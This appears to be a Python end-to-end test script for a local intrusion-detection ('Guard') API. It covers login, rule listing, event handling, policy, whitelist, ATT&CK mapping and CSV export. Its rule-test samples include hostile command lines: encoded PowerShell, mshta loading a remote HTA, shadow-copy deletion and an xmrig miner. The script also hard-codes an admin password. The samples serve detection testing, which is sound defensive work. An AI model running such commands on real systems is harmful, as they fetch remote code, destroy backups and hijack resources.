# -*- coding: utf-8 -*-
"""Guard API 端到端自测：登录 -> 状态 -> 手动跑一轮 -> 事件 -> 规则测试 -> 策略 -> 导出。"""
import json
import sys
import time
import urllib.error
import urllib.request

BASE = "http://127.0.0.1:18080"
_cookie = {"v": ""}


def call(path, method="GET", body=None, retry=30):
    for _ in range(retry):
        try:
            return _call(path, method, body)
        except urllib.error.URLError:
            time.sleep(0.5)
    return _call(path, method, body)


def _call(path, method, body):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if _cookie["v"]:
        req.add_header("Cookie", _cookie["v"])
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            raw = r.read().decode("utf-8")
            for c in r.headers.get_all("Set-Cookie") or []:
                _cookie["v"] = c.split(";")[0]
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw


def ok(label, cond, extra=""):
    print(("  PASS " if cond else "  FAIL ") + label + ("  " + str(extra) if extra else ""))
    return bool(cond)


fails = 0

print("[1] 登录")
s, r = call("/api/auth/login", "POST", {"username": "admin", "password": "BlueGuard@2026"})
fails += 0 if ok("login", s == 200 and r.get("token"), s) else 1

print("[2] health / guard status")
s, r = call("/api/health")
fails += 0 if ok("health.guard", s == 200 and "guard" in r, r.get("guard")) else 1
s, st = call("/api/guard/status")
fails += 0 if ok("guard.status", s == 200 and "today" in st,
                 "events=%s admin=%s" % (st.get("today", {}).get("events"), st.get("admin"))) else 1

print("[3] 规则清单")
s, rr = call("/api/guard/rules")
items = rr.get("items", []) if isinstance(rr, dict) else []
fails += 0 if ok("rules.total", s == 200 and len(items) >= 20, len(items)) else 1
by_id = {i["rule_id"]: i for i in items}

print("[4] 规则自测（合成样本）")
cases = [
    ("PS-ENCODED", {"name": "powershell.exe", "cmdline": "powershell -nop -enc SQBFAFgA" + "A" * 40}, True),
    ("PS-ENCODED", {"name": "notepad.exe", "cmdline": "notepad a.txt"}, False),
    ("LOLBIN-MSHTA", {"name": "mshta.exe", "cmdline": "mshta http://x/a.hta"}, True),
    ("SHADOW-DELETE", {"name": "vssadmin.exe", "cmdline": "vssadmin delete shadows /all /quiet"}, True),
    ("MINER", {"name": "xmrig.exe", "cmdline": "xmrig -o stratum+tcp://pool:3333"}, True),
]
for rid, sample, expect in cases:
    rule = by_id.get(rid)
    if not rule:
        fails += 1
        print("  FAIL 缺少规则", rid)
        continue
    s, r = call("/api/guard/rules/%d/test" % rule["id"], "POST", {"sample": sample})
    fails += 0 if ok("rule %s -> %s" % (rid, expect), s == 200 and r.get("hit") == expect,
                     r.get("hit") if isinstance(r, dict) else r) else 1

print("[5] 手动跑一轮（deep）")
t = time.time()
s, run = call("/api/guard/run", "POST", {"deep": True})
dt = time.time() - t
fails += 0 if ok("guard.run", s == 200 and "hits" in run,
                 "hits=%s merged=%s %dms" % (run.get("hits"), run.get("merged"), run.get("elapsed_ms"))) else 1

print("[6] 事件列表 / 详情")
s, ev = call("/api/guard/events?size=5")
fails += 0 if ok("events list", s == 200 and ev.get("total") is not None,
                 "total=%s" % ev.get("total")) else 1
if ev.get("items"):
    eid = ev["items"][0]["id"]
    s, d = call("/api/guard/events/%d" % eid)
    fails += 0 if ok("event detail", s == 200 and "evidence" in d,
                     d.get("rule_name")) else 1
    s, r = call("/api/guard/events/%d/status" % eid, "POST", {"status": "ack"})
    fails += 0 if ok("event ack", s == 200 and r.get("ok")) else 1

print("[7] 策略读写")
s, p = call("/api/guard/policy")
cur = p.get("policy", {}) if isinstance(p, dict) else {}
fails += 0 if ok("policy get", s == 200 and cur.get("mode") == "monitor", cur.get("mode")) else 1
s, r = call("/api/guard/policy", "PUT", {"interval_sec": 6, "mode": "monitor"})
fails += 0 if ok("policy put", s == 200 and r.get("ok"), r) else 1
s, r = call("/api/guard/policy", "PUT", {"mode": "hack"})
fails += 0 if ok("policy 拒绝非法 mode", s == 400, s) else 1

print("[8] 白名单")
s, r = call("/api/guard/whitelist", "POST", {"kind": "ip", "value": "192.0.2.77", "note": "自测"})
fails += 0 if ok("whitelist add", s == 200 and r.get("ok"), r) else 1
s, wl = call("/api/guard/whitelist")
fails += 0 if ok("whitelist list", s == 200 and any(
    i["value"] == "192.0.2.77" for i in wl.get("items", []))) else 1

print("[9] ATT&CK / 基线 / 防火墙对账")
s, m = call("/api/guard/mitre")
fails += 0 if ok("mitre", s == 200 and m.get("total", 0) > 20, m.get("total")) else 1
s, b = call("/api/guard/baseline")
fails += 0 if ok("baseline", s == 200 and b.get("stats") is not None, b.get("stats")) else 1
s, f = call("/api/guard/firewall")
fails += 0 if ok("firewall 对账", s == 200 and "host_rules" in f,
                 "host=%d admin=%s" % (f.get("count", 0), f.get("admin"))) else 1

print("[10] 导出 CSV")
s, csv_text = call("/api/guard/export?days=7")
fails += 0 if ok("export", s == 200 and isinstance(csv_text, str) and "严重度" in csv_text,
                 "%d 字符" % len(csv_text if isinstance(csv_text, str) else "")) else 1

print("\n失败项：%d" % fails)
sys.exit(1 if fails else 0)
